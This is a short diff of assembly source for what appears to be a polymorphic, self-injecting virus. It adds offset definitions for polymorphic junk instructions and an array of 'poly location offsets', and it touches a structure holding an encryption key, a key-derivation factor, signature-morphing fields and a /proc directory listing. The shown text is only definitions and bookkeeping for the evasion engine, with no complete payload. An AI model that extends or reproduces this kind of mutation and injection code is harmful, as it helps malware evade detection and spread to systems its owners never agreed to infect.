@@ -58,8 +58,11 @@
 
 %define POLY_CRAP_SKIPPED_OFFSET inject_self.poly_crap_skipped - _start ; offset of skipped random polymorphic 
 
-%define POLY_NOP_1_OFFSET _start.poly_nop_1 - _start			;offset of poly_nop_1 from _start
 %define POLY_OFFSET_1	_start.label_poly1 - _start				;	
+%define POLY_NOP_1_OFFSET _start.poly_nop_1 - _start			;offset of poly_nop_1 from _start
+%define POLY_NOP_2_OFFSET _start.label_poly1 - _start - 5
+%define POLY_NOP_3_OFFSET _start.poly_nop_3 - _start
+
 
 %define POLY_NOP_SIZE 4								;size of polymorphic nops
 %define POLY_NOP_NUMBER 0x000000007			; amount of nops equal instruction possible 
@@ -68,6 +71,8 @@
 
 %define POLY_XOR_SIZE 6				;size of poly xor
 %define POLY_XOR_NUMBER 0x000000005 ;nbx of polyxor posssible 
+
+
 
 
 %macro OBF_POLY_1 0
@@ -500,8 +505,9 @@ db 0xF3
 .key			resb	1				; location to key
 .factor			resb	1				; factor to derivate key
 .morph_sign_u	resb	1				; factor to add to signature
-.morph_sign_d	resb	1				; factor to add to ssignature  tenth
+.morph_sign_d	resb	1				; factor to add to signature  tenth
 .tmp_rand		resw	1				;
 .commpath		resb	100				; path to commfiles
+.poly_offsets	resd	100				; Array ouf poly location offsets
 .dirents_proc	resb	DIRENT_ARR_SIZE	; Array of dirents for /proc
 endstruc
